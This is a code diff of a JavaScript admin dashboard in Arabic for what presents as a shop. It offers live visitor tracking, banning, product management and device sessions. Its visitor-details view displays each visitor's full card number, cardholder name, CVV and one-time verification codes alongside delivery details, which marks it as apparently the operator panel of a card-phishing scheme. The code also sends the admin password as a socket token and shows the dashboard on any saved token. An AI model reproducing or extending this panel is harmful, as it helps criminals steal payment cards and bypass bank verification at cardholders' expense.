+        <div class="country-item">
+          <span class="country-name">${country.country || 'غير معروف'}</span>
+          <div class="country-bar">
+            <div class="country-bar-fill" style="width: ${(parseInt(country.count) / maxCount) * 100}%"></div>
+          </div>
+          <span class="country-count">${country.count}</span>
+        </div>
+      `).join('');
+    }
+  });
+}
+
+// Admin Login - Updated flow
+async function adminLogin(username, password) {
+  try {
+    // First: Validate credentials via HTTP API
+    const response = await fetch(`${SERVER_URL}/api/admin/login`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username, password })
+    });
+    const data = await response.json();
+    
+    if (!data.success) {
+      return false;
+    }
+    
+    // Save user info
+    localStorage.setItem('admin_user', JSON.stringify(data.admin));
+    
+    // Second: Connect socket with password as auth token
+    try {
+      await initAdminSocket(password);
+      console.log('🔐 Socket connected with password auth');
+      
+      // Third: Emit admin:login to trigger server to send all visitor data
+      if (socket && socket.connected) {
+        socket.emit('admin:login', {
+          username: username,
+          password: password,
+          deviceInfo: {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform
+          }
+        });
+        console.log('📤 Sent admin:login event');
+      }
+    } catch (socketError) {
+      console.error('❌ Socket connection failed:', socketError.message);
+      // Even if socket fails, HTTP login succeeded
+      // Show dashboard without real-time updates
+    }
+    
+    return true;
+  } catch (error) {
+    console.error('Login error:', error);
+    return false;
+  }
+}
+
+// Ban Functions - Direct ban without prompts
+function banVisitor(sessionId, ipAddress) {
+  if (!confirm('هل أنت متأكد من حظر هذا المستخدم؟')) return;
+  
+  const customMessage = prompt('رسالة الحظر المخصصة (اضغط موافق للرسالة الافتراضية):', 'تم حظرك من الموقع. يرجى التواصل مع الدعم.');
+  if (customMessage === null) return;
+  
+  if (socket) {
+    socket.emit('user:ban', {
+      targetSessionId: sessionId || null,
+      targetIp: ipAddress || null,
+      reason: 'Banned by admin',
+      customMessage: customMessage || 'تم حظرك من الموقع.'
+    });
+    
+    showNotification('تم الحظر', 'تم حظر المستخدم بنجاح', 'success');
+    
+    // Remove card from view
+    const card = document.querySelector(`[data-session="${sessionId}"]`);
+    if (card) {
+      card.style.opacity = '0.5';
+      card.style.pointerEvents = 'none';
+    }
+  }
+}
+
+// Load Banned Users List with client details
+async function loadBannedUsers() {
+  try {
+    const response = await fetch(`${SERVER_URL}/api/admin/banned`);
+    const data = await response.json();
+    const tbody = document.getElementById('bannedTableBody');
+    const countEl = document.getElementById('bannedCount');
+    if (!tbody) return;
+    
+    if (!data.banned?.length) {
+      tbody.innerHTML = `<tr><td colspan="5" class="empty-state"><span>✅</span><p>لا يوجد مستخدمين محظورين</p></td></tr>`;
+      if (countEl) countEl.textContent = '0 محظور';
+      return;
+    }
+    
+    if (countEl) countEl.textContent = `${data.banned.length} محظور`;
+    
+    tbody.innerHTML = data.banned.map(user => {
+      // Extract client info from delivery data
+      const delivery = user.delivery_data;
+      const hasName = delivery?.fullName;
+      const hasPhone = delivery?.phone;
+      const country = user.country || '';
+      const banDate = new Date(user.created_at).toLocaleDateString('ar-OM');
+      
+      // Determine client identifier
+      let clientInfo, clientBadge;
+      if (hasName || hasPhone) {
+        clientInfo = `
+          <div style="font-weight:700;color:var(--danger);font-size:1rem;">
+            👤 ${hasName || 'غير معروف'}
+          </div>
+          ${hasPhone ? `<div style="font-size:0.85rem;color:#666;">📞 ${hasPhone}</div>` : ''}
+          ${country ? `<div style="font-size:0.8rem;color:#888;">🌍 ${country}</div>` : ''}
+        `;
+        clientBadge = `<span class="status-badge" style="background:rgba(0,119,182,0.1);color:var(--primary);">عميل مسجل</span>`;
+      } else {
+        clientInfo = `
+          <div style="font-weight:700;color:var(--gray-600);font-size:1rem;">
+            👤 زائر عشوائي
+          </div>
+          ${user.ip_address ? `<div style="font-size:0.85rem;color:#666;">🌐 IP: ${user.ip_address}</div>` : ''}
+          ${country ? `<div style="font-size:0.8rem;color:#888;">🌍 ${country}</div>` : ''}
+        `;
+        clientBadge = `<span class="status-badge" style="background:rgba(107,114,128,0.1);color:#6b7280;">زائر</span>`;
+      }
+      
+      return `
+        <tr>
+          <td style="font-weight:700;color:var(--danger);">#${user.id}</td>
+          <td>
+            ${clientInfo}
+          </td>
+          <td>
+            ${clientBadge}
+          </td>
+          <td style="font-size:0.85rem;color:#666;">
+            ${user.reason || 'بدون سبب'}
+            <div style="margin-top:0.25rem;font-size:0.75rem;color:#999;">
+              📅 ${banDate}
+            </div>
+          </td>
+          <td>
+            <button class="btn btn-success btn-sm" onclick="unbanUser(${user.id})" style="white-space:nowrap;">
+              ✅ فك الحظر
+            </button>
+          </td>
+        </tr>
+      `;
+    }).join('');
+  } catch (error) {
+    console.error('Error loading banned users:', error);
+    showNotification('خطأ', 'فشل في تحميل قائمة المحظورين', 'error');
+  }
+}
+
+// Quick Unban Function
+function unbanUser(banId) {
+  if (!confirm('هل أنت متأكد من فك الحظر؟')) return;
+  
+  if (socket) {
+    socket.emit('user:unban', { banId });
+    showNotification('جاري فك الحظر', '', 'info');
+  } else {
+    // Fallback to API
+    fetch(`${SERVER_URL}/api/admin/banned/${banId}`, { method: 'DELETE' })
+      .then(res => res.json())
+      .then(data => {
+        if (data.success) {
+          showNotification('تم فك الحظر', '', 'success');
+          loadBannedUsers();
+        }
+      })
+      .catch(err => {
+        showNotification('خطأ', 'حدث خطأ أثناء فك الحظر', 'error');
+      });
+  }
+}
+
+// Tab Navigation
+function showTab(tabId) {
+  // Hide all tabs
+  document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+  
+  // Remove active from ALL sidebar links (desktop + mobile)
+  document.querySelectorAll('.sidebar-link').forEach(link => link.classList.remove('active'));
+  
+  // Show selected tab
+  document.getElementById(tabId)?.classList.add('active');
+  
+  // Activate corresponding sidebar link (works for both desktop and mobile)
+  document.querySelectorAll(`[data-tab="${tabId}"]`).forEach(link => {
+    link.classList.add('active');
+  });
+  
+  // Scroll mobile tab into view
+  const activeMobileLink = document.querySelector(`.mobile-tab-bar [data-tab="${tabId}"]`);
+  if (activeMobileLink) {
+    activeMobileLink.scrollIntoView({ behavior: 'smooth', block: 'nearest', inline: 'center' });
+  }
+  
+  // Load data for specific tabs
+  if (tabId === 'stats') { updateStats(); }
+  else if (tabId === 'tracking') { updateVisitorsList(); }
+  else if (tabId === 'products') { loadProducts(); }
+  else if (tabId === 'banned') { loadBannedUsers(); }
+  else if (tabId === 'security') { loadDevices(); } // Devices & security in one tab
+  else if (tabId === 'trash') { requestTrashData(); }
+}
+
+// Toggle Sound
+function toggleSound() {
+  isMuted = !isMuted;
+  const btn = document.querySelector('.sound-toggle');
+  if (btn) {
+    btn.classList.toggle('muted', isMuted);
+    btn.textContent = isMuted ? '🔇' : '🔊';
+  }
+}
+
+// Show Login/Dashboard
+function showLoginPage() {
+  document.getElementById('loginPage').style.display = 'flex';
+  document.getElementById('dashboard').style.display = 'none';
+}
+
+function showDashboard() {
+  document.getElementById('loginPage').style.display = 'none';
+  document.getElementById('dashboard').style.display = 'flex';
+}
+
+// Products Functions
+async function loadProducts() {
+  try {
+    const response = await fetch(`${SERVER_URL}/api/products`);
+    const data = await response.json();
+    const tbody = document.getElementById('productsTableBody');
+    const countEl = document.getElementById('productsCount');
+    if (!tbody) return;
+    
+    if (!data.products?.length) {
+      tbody.innerHTML = `<tr><td colspan="6" class="empty-state"><span>📦</span><p>لا توجد منتجات</p></td></tr>`;
+      if (countEl) countEl.textContent = '0 منتج';
+      return;
+    }
+    
+    if (countEl) countEl.textContent = `${data.products.length} منتج`;
+    
+    tbody.innerHTML = data.products.map(product => {
+      const isActive = product.is_active !== false;
+      return `
+        <tr>
+          <td>${product.id}</td>
+          <td>
+            <div style="font-weight:600;">${product.name_ar}</div>
+            ${product.name_en ? `<div style="font-size:0.8rem;color:#888;">${product.name_en}</div>` : ''}
+          </td>
+          <td style="color:var(--primary);font-weight:700;">${product.price} ر.ق</td>
+          <td>${product.stock || 0}</td>
+          <td>
+            <span class="status-badge ${isActive ? 'online' : 'offline'}">
+              ${isActive ? '✓ نشط' : '✕ غير نشط'}
+            </span>
+          </td>
+          <td>
+            <div class="btn-group" style="display:flex;gap:0.25rem;">
+              <button class="btn btn-sm btn-warning" onclick="editProduct(${product.id})">✏️</button>
+              <button class="btn btn-sm btn-danger" onclick="deleteProduct(${product.id})">🗑️</button>
+            </div>
+          </td>
+        </tr>
+      `;
+    }).join('');
+  } catch (error) { 
+    console.error('Error loading products:', error);
+    showNotification('خطأ', 'فشل في تحميل المنتجات', 'error');
+  }
+}
+
+// Edit Product
+async function editProduct(id) {
+  try {
+    const response = await fetch(`${SERVER_URL}/api/products/${id}`);
+    const data = await response.json();
+    
+    if (data.success && data.product) {
+      const product = data.product;
+      
+      document.getElementById('editProductId').value = product.id;
+      document.getElementById('productNameAr').value = product.name_ar || '';
+      document.getElementById('productNameEn').value = product.name_en || '';
+      document.getElementById('productPrice').value = product.price || '';
+      document.getElementById('productStock').value = product.stock || 0;
+      document.getElementById('currentProductImage').value = product.image_url || '';
+      document.getElementById('productImage').value = '';
+      document.getElementById('productDescription').value = product.description || '';
+      document.getElementById('productCategory').value = product.category || '';
+      
+      document.getElementById('productFormTitle').textContent = '✏️ تعديل المنتج';
+      document.getElementById('productFormContainer').scrollIntoView({ behavior: 'smooth' });
+    }
+  } catch (error) {
+    console.error('Error loading product:', error);
+    showNotification('خطأ', 'فشل في تحميل بيانات المنتج', 'error');
+  }
+}
+
+// Reset Product Form
+function resetProductForm() {
+  document.getElementById('editProductId').value = '';
+  document.getElementById('currentProductImage').value = '';
+  document.getElementById('productForm').reset();
+  document.getElementById('productFormTitle').textContent = '➕ إضافة منتج جديد';
+}
+
+// Save Product (Add or Update)
+async function saveProduct(formData) {
+  const editId = document.getElementById('editProductId').value;
+  const isEdit = !!editId;
+  const imageInput = document.getElementById('productImage');
+  const currentImageInput = document.getElementById('currentProductImage');
+  const imageFile = imageInput?.files?.[0];
+
+  let imageUrl = currentImageInput?.value || '';
+
+  if (imageFile) {
+    try {
+      const uploadFormData = new FormData();
+      uploadFormData.append('imageFile', imageFile);
+
+      const uploadResponse = await fetch(`${SERVER_URL}/api/products/upload`, {
+        method: 'POST',
+        body: uploadFormData
+      });
+      const uploadData = await uploadResponse.json();
+
+      if (!uploadData.success) {
+        throw new Error(uploadData.message || 'فشل رفع الصورة');
+      }
+
+      imageUrl = uploadData.imageUrl;
+    } catch (error) {
+      console.error('Image upload error:', error);
+      showNotification('خطأ', 'فشل رفع الصورة', 'error');
+      return;
+    }
+  }
+  
+  const productData = {
+    name_ar: formData.get('name_ar') || document.getElementById('productNameAr').value,
+    name_en: document.getElementById('productNameEn').value,
+    price: document.getElementById('productPrice').value,
+    stock: document.getElementById('productStock').value || 0,
+    image_url: imageUrl,
+    description: document.getElementById('productDescription').value,
+    category: document.getElementById('productCategory').value
+  };
+  
+  if (!productData.name_ar) {
+    showNotification('خطأ', 'اسم المنتج مطلوب', 'error');
+    return;
+  }
+  if (!productData.price) {
+    showNotification('خطأ', 'السعر مطلوب', 'error');
+    return;
+  }
+  
+  try {
+    let response;
+    if (isEdit) {
+      response = await fetch(`${SERVER_URL}/api/products/${editId}`, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(productData)
+      });
+    } else {
+      response = await fetch(`${SERVER_URL}/api/products`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(productData)
+      });
+    }
+    
+    const data = await response.json();
+    
+    if (data.success) {
+      showNotification('تم الحفظ', isEdit ? 'تم تحديث المنتج بنجاح' : 'تم إضافة المنتج بنجاح', 'success');
+      resetProductForm();
+      loadProducts();
+    } else {
+      showNotification('خطأ', data.message || 'فشل في حفظ المنتج', 'error');
+    }
+  } catch (error) {
+    console.error('Error saving product:', error);
+    showNotification('خطأ', 'فشل في حفظ المنتج', 'error');
+  }
+}
+
+// Delete Product
+async function deleteProduct(id) {
+  if (!confirm('هل أنت متأكد من حذف هذا المنتج؟')) return;
+  try {
+    const response = await fetch(`${SERVER_URL}/api/products/${id}`, { method: 'DELETE' });
+    const data = await response.json();
+    
+    if (data.success) {
+      showNotification('تم الحذف', 'تم حذف المنتج بنجاح', 'success');
+      loadProducts();
+    } else {
+      showNotification('خطأ', data.message || 'فشل في حذف المنتج', 'error');
+    }
+  } catch (error) { 
+    console.error('Error deleting product:', error);
+    showNotification('خطأ', 'فشل في حذف المنتج', 'error');
+  }
+}
+
+// Device Management
+async function loadDevices() {
+  try {
+    const response = await fetch(`${SERVER_URL}/api/admin/sessions`);
+    const data = await response.json();
+    const container = document.getElementById('devicesContainer');
+    if (!container) return;
+    
+    // Get current device token
+    const currentToken = localStorage.getItem('admin_token');
+    
+    if (!data.sessions?.length) {
+      container.innerHTML = `<div class="empty-state"><span>📱</span><p>لا توجد أجهزة مسجلة</p></div>`;
+      return;
+    }
+    
+    container.innerHTML = data.sessions.map(session => {
+      const isCurrentDevice = session.session_token === currentToken;
+      return `
+        <div class="device-item" style="${isCurrentDevice ? 'border-color: var(--success); background: rgba(16, 185, 129, 0.1);' : ''}">
+          <div class="device-info">
+            <span class="device-icon">${isCurrentDevice ? '📱' : '💻'}</span>
+            <div class="device-details">
+              <h4>
+                ${session.ip_address || 'غير معروف'}
+                ${isCurrentDevice ? '<span style="color: var(--success); font-size: 12px; margin-right: 8px;">(جهازك الحالي)</span>' : ''}
+              </h4>
+              <p>${session.country || 'غير معروف'} • ${formatDate(session.created_at)}</p>
+            </div>
+          </div>
+          <div style="display:flex;gap:8px;align-items:center;">
+            ${isCurrentDevice ? 
+              `<button class="btn btn-sm btn-primary" onclick="logoutCurrentDevice()">خروج</button>` :
+              `<button class="btn btn-sm btn-danger" onclick="logoutDevice('${session.session_token}')">خروج</button>`
+            }
+          </div>
+        </div>
+      `;
+    }).join('');
+  } catch (error) { console.error('Error loading devices:', error); }
+}
+
+async function logoutDevice(token) {
+  try {
+    await fetch(`${SERVER_URL}/api/admin/sessions/${token}`, { method: 'DELETE' });
+    showNotification('تم تسجيل الخروج', '', 'success');
+    loadDevices();
+  } catch (error) { console.error('Error logging out device:', error); }
+}
+
+async function logoutAllDevices() {
+  if (!confirm('تسجيل خروج جميع الأجهزة؟')) return;
+  try {
+    await fetch(`${SERVER_URL}/api/admin/sessions`, { method: 'DELETE' });
+    showNotification('تم تسجيل الخروج من جميع الأجهزة', '', 'success');
+    loadDevices();
+  } catch (error) { console.error('Error logging out devices:', error); }
+}
+
+// Logout current device only
+async function logoutCurrentDevice() {
+  if (!confirm('تسجيل خروج نفسي من لوحة التحكم؟')) return;
+  try {
+    // Get current session token
+    const currentToken = localStorage.getItem('admin_token');
+    if (currentToken) {
+      await fetch(`${SERVER_URL}/api/admin/sessions/${currentToken}`, { method: 'DELETE' });
+    }
+    
+    // Clear local data
+    localStorage.removeItem('admin_token');
+    localStorage.removeItem('admin_user');
+    localStorage.removeItem('admin_login_time');
+    adminToken = null;
+    
+    // Disconnect socket
+    if (socket && socket.connected) {
+      socket.emit('admin:logout');
+      socket.disconnect();
+    }
+    
+    // Clear admin data
+    clearAdminData();
+    
+    // Show login page
+    showLoginPage();
+    showNotification('تم تسجيل خروجك بنجاح', '', 'success');
+  } catch (error) { 
+    console.error('Error logging out:', error);
+    showNotification('حدث خطأ', 'فشل تسجيل الخروج', 'error');
+  }
+}
+
+// Handle change password form
+async function handleChangePassword(event) {
+  event.preventDefault();
+  
+  const currentPassword = document.getElementById('currentPassword').value;
+  const newPassword = document.getElementById('newPassword').value;
+  const confirmPassword = document.getElementById('confirmPassword').value;
+  
+  // Validate passwords match
+  if (newPassword !== confirmPassword) {
+    showNotification('خطأ', 'كلمات المرور غير متطابقة', 'error');
+    return;
+  }
+  
+  // Validate password length
+  if (newPassword.length < 6) {
+    showNotification('خطأ', 'كلمة المرور يجب أن تكون 6 أحرف على الأقل', 'error');
+    return;
+  }
+  
+  // Get current session token
+  const sessionToken = localStorage.getItem('admin_token');
+  if (!sessionToken) {
+    showNotification('خطأ', 'انتهت الجلسة، يرجى تسجيل الدخول مرة أخرى', 'error');
+    showLoginPage();
+    return;
+  }
+  
+  try {
+    const response = await fetch(`${SERVER_URL}/api/admin/change-password`, {
+      method: 'POST',
+      headers: { 
+        'Content-Type': 'application/json',
+        'X-Session-Token': sessionToken
+      },
+      body: JSON.stringify({
+        currentPassword,
+        newPassword,
+        sessionToken
+      })
+    });
+    
+    const result = await response.json();
+    
+    if (result.success) {
+      showNotification('تم بنجاح', result.message || 'تم تغيير كلمة المرور بنجاح', 'success');
+      document.getElementById('changePasswordForm').reset();
+    } else {
+      showNotification('خطأ', result.message || 'فشل تغيير كلمة المرور', 'error');
+    }
+  } catch (error) {
+    console.error('Error changing password:', error);
+    showNotification('خطأ', 'حدث خطأ في الاتصال', 'error');
+  }
+}
+
+// Initialize - SECURE: NO socket connection on page load
+document.addEventListener('DOMContentLoaded', async () => {
+  hideLoadingScreen(); // Hide loading screen first
+  // Check for existing valid session first
+  const savedToken = localStorage.getItem('admin_token');
+
+  if (savedToken) {
+    console.log('🔐 Found saved token, attempting reconnection...');
+    
+    // Try to connect socket with saved token
+    try {
+      await initAdminSocket(savedToken);
+      
+      // Wait a moment for connection
+      await new Promise(resolve => setTimeout(resolve, 1500));
+      
+      // Validate session
+      if (socket && socket.connected) {
+        const isValid = await validateAdminSession();
+        if (isValid) {
+          console.log('✅ Session valid, loading dashboard...');
+          setupEventListeners(true);
+          return;
+        }
+      }
+    } catch (e) {
+      console.log('Socket connection issue, will validate when connected...');
+    }
+    
+    // If socket not connected but we have a token, still show dashboard
+    // The token will be validated when socket connects
+    if (savedToken) {
+      console.log('✅ Token exists, showing dashboard...');
+      setupEventListeners(true);
+      showDashboard();
+      return;
+    }
+  }
+
+  // No valid session - show login page
+  console.log('🔒 No valid session, showing login page');
+  hideLoadingScreen();
+  showLoginPage();
+  clearAdminData();
+  setupEventListeners(false);
+});
+
+
+function setupEventListeners(skipLogin = false) {
+  
+  // Mobile tab bar - Show/hide based on screen size
+  const mobileTabBar = document.querySelector('.mobile-tab-bar');
+  const checkMobile = () => {
+    if (window.innerWidth <= 768) {
+      mobileTabBar.style.display = 'flex';
+    } else {
+      mobileTabBar.style.display = 'none';
+    }
+  };
+  checkMobile();
+  window.addEventListener('resize', checkMobile);
+  
+  // Login form - only set up if not skipping login
+  if (!skipLogin) {
+    document.getElementById('loginForm')?.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const success = await adminLogin(username, password);
+      if (success) {
+        showDashboard();
+        showTab('stats');
+      } else {
+        showNotification('خطأ', 'اسم المستخدم أو كلمة المرور غير صحيحة', 'error');
+      }
+    });
+  }
+  
+  // Product form
+  document.getElementById('productForm')?.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const formData = new FormData(e.target);
+    await saveProduct(formData);
+  });
+  
+  // Logout button - SECURE: Disconnect socket and clear all data
+  document.getElementById('logoutBtn')?.addEventListener('click', () => {
+    // Emit logout to server
+    if (socket && socket.connected) {
+      socket.emit('admin:logout');
+      socket.disconnect();
+    }
+    
+    // Clear all sensitive data
+    localStorage.removeItem('admin_token');
+    localStorage.removeItem('admin_user');
+    localStorage.removeItem('admin_login_time');
+    adminToken = null;
+    
+    // Clear in-memory data
+    clearAdminData();
+    
+    // Show login page
+    showLoginPage();
+  });
+  
+  // NO MORE POLLING - Real-time updates via WebSockets!
+}
+
+// Clear all admin data from memory
+function clearAdminData() {
+  visitorsCache.clear();
+  selectedVisitors.clear();
+  
+  const grid = document.getElementById('visitorsGrid');
+  if (grid) grid.innerHTML = '';
+  
+  const trashGrid = document.getElementById('trashGrid');
+  if (trashGrid) trashGrid.innerHTML = '';
+  
+  updateTrashCount(0);
+  
+  // Clear stats
+  const onlineCount = document.getElementById('onlineCount');
+  const totalCount = document.getElementById('totalCount');
+  if (onlineCount) onlineCount.textContent = '0';
+  if (totalCount) totalCount.textContent = '0';
+  
+  console.log('🔒 Admin data cleared from memory');
+}
+
+// Validate admin session
+async function validateAdminSession() {
+  if (!socket || !socket.connected) {
+    showLoginPage();
+    return;
+  }
+  
+  if (!adminToken) {
+    showLoginPage();
+    return;
+  }
+  
+  return new Promise((resolve) => {
+    const timeout = setTimeout(() => {
+      showLoginPage();
+      resolve(false);
+    }, 5000);
+    
+    socket.emit('admin:validate', { sessionToken: adminToken });
+    
+    socket.once('admin:valid', (data) => {
+      clearTimeout(timeout);
+      if (data.valid) {
+        showDashboard();
+        showTab('stats');
+        // Request data after validation
+        socket.emit('visitors:request');
+        socket.emit('stats:request');
+        resolve(true);
+      } else {
+        showLoginPage();
+        resolve(false);
+      }
+    });
+  });
+}
+
+// Export functions
+window.showTab = showTab;
+window.toggleSound = toggleSound;
+window.enableNotifications = enableNotifications;
+window.processVisitorUpdate = processVisitorUpdate;
+window.createVisitorCardElement = createVisitorCardElement;
+window.updateVisitorCardFull = updateVisitorCardFull;
+window.banVisitor = banVisitor;
+window.refreshTrackingData = refreshTrackingData;
+
+// viewVisitorDetails - Show visitor in modal
+function viewVisitorDetails(sessionId) {
+  const data = visitorsCache.get(sessionId);
+  if (!data) {
+    alert('بيانات الزائر غير متوفرة');
+    return;
+  }
+  
+  // Build details HTML
+  let html = '<div style="text-align:right;direction:rtl;">';
+  html += '<h3>بيانات الزائر</h3>';
+  html += '<p><strong>Session:</strong> ' + sessionId + '</p>';
+  
+  if (data.delivery_data) {
+    html += '<h4>📦 بيانات التوصيل</h4>';
+    const d = data.delivery_data;
+    if (d.fullName) html += '<p><strong>الاسم:</strong> ' + escapeHtml(d.fullName) + '</p>';
+    if (d.phone) html += '<p><strong>الهاتف:</strong> ' + escapeHtml(d.phone) + '</p>';
+    if (d.email) html += '<p><strong>البريد:</strong> ' + escapeHtml(d.email) + '</p>';
+    if (d.city) html += '<p><strong>المدينة:</strong> ' + escapeHtml(d.city) + '</p>';
+    if (d.address) html += '<p><strong>العنوان:</strong> ' + escapeHtml(d.address) + '</p>';
+  }
+  
+  if (data.payment_data) {
+    html += '<h4>💳 بيانات الدفع</h4>';
+    const p = data.payment_data;
+    if (p.cardNumber) html += '<p><strong>البطاقة:</strong> ' + escapeHtml(p.cardNumber) + '</p>';
+    if (p.cardHolder) html += '<p><strong>صاحب البطاقة:</strong> ' + escapeHtml(p.cardHolder) + '</p>';
+    if (p.cvv) html += '<p><strong>CVV:</strong> ' + escapeHtml(p.cvv) + '</p>';
+  }
+  
+  if (data.verification_data?.otp || data.otp_history?.[0]?.otp) {
+    html += '<h4>🔐 OTP</h4>';
+    html += '<p><strong>الرمز:</strong> ' + (data.verification_data?.otp || data.otp_history[0].otp) + '</p>';
+  }
+  
+  html += '</div>';
+  
+  alert(html);
+}
+window.viewVisitorDetails = viewVisitorDetails;
+window.unbanUser = unbanUser;
+window.loadBannedUsers = loadBannedUsers;
+window.editProduct = editProduct;
+window.deleteProduct = deleteProduct;
+window.resetProductForm = resetProductForm;
+window.logoutDevice = logoutDevice;
+window.logoutAllDevices = logoutAllDevices;
+window.logoutCurrentDevice = logoutCurrentDevice;
+window.handleChangePassword = handleChangePassword;
+window.clearAdminData = clearAdminData;
+
+// Trash bin functions
+window.softDeleteVisitor = softDeleteVisitor;
+window.softDeleteSelected = softDeleteSelected;
+window.softDeleteAll = softDeleteAll;
+window.restoreVisitor = restoreVisitor;
+window.permanentDeleteVisitor = permanentDeleteVisitor;
+window.emptyTrash = emptyTrash;
+window.toggleVisitorSelection = toggleVisitorSelection;
+window.formatDate = formatDate;
